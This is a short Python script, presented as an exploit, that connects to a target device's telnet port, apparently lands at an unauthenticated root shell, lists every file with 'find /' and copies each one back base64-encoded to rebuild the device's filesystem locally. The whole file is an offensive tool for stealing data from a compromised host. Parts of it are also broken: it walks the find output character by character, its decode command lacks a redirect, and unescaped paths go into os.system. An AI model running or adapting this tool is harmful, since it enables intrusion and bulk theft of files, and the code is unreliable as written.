from os import walk, path, system
import socket, argparse
from time import sleep


files_list = []
dir_list = []
sock = None
data = ''
'''
def discovery(initial_path):
    
    global dir_list, files_list

    for dirpath, dirs, files in walk(initial_path):
        
        for _file in files:
            
            absolute_path = path.abspath(path.join(dirpath, _file)) 
            
            if dirpath not in dir_list: 
                dir_list.append(dirpath)
            
            files_list.append(absolute_path)

    
    
    return True

'''

def recv_data(send_data: str):
    global sock

    sock.send(send_data.encode())
    tmp = ''
    while '[root@GX662:'.encode() not in tmp:
        tmp += sock.recv(512).decode()
    
    tmp = tmp.replace('[root@GX662:', '')
    tmp = tmp.replace(send_data+'\n', '')

    return tmp


def discovery():
    
    global data
    
    data = recv_data('find /')

    return True


def dir_tree(init_path):

    global dir_list, data 

    for it in data:
        payload = 'file '+it+'\n'
        tmp = recv_data(payload)

        if 'directory' in tmp: 
            dir_list.append(it)
        else: 
            files_list.append(it)

    for _dir in dir_list:
        _path = init_path+_dir
        system('mkdir '+_path)

    return True



def connection(ip='10.0.1.7',port=23):
    global sock

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))

    return True


def get_file(save_locate):
    global files_list

    for _file in files_list:
        data = recv_data('base64 '+_file+'\n')
        tmp = 'echo '+data+' | base64 -d '+save_locate+_file
        system(tmp)
    
    return True


def main():
    
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', help='is target ip')
    parser.add_argument('-s', help='where do you want to save')
    args = parser.parse_args()
    
    print('#'+'exploit is running'.center(40,' ')+'#')
    sleep(1)
    print('#'+'try conection'.center(40, ' ')+'#')
    
    try:
        connection(ip=args.i)
        print('#'+'connected!'.center(40, ' ')+'#')
    except Exception as e:
        print('#'+'not connected! logs in erro.log'.center(40, ' ')+'#')
        system('echo "'+str(e)+'" > '+args.s+'/erro.log\n')
        exit()
    
    print('#'+'discovering files'.center(40, ' ')+'#')
    discovery()
    sleep(1)
    print('#'+'trying to creating dir tree'.center(40, ' ')+'#')
    
    try:
        dir_tree(args.s)
        print('#'+'dir tree has created!'.center(40, ' ')+'#')
    except:
        print('#'+'unable to create dir tree'.center(40, ' ')+'#')
        exit()
    sleep(1)
    print('#'+'trying to download files'.center(40, ' ')+'#')
    
    try: 
        get_file(args.s)
        print('#'+'download complete'.center(40, ' ')+'#')
    except:
        print('#'+'download erro'.center(40, ' ')+'#')

   

if __name__ == "__main__":
    main()
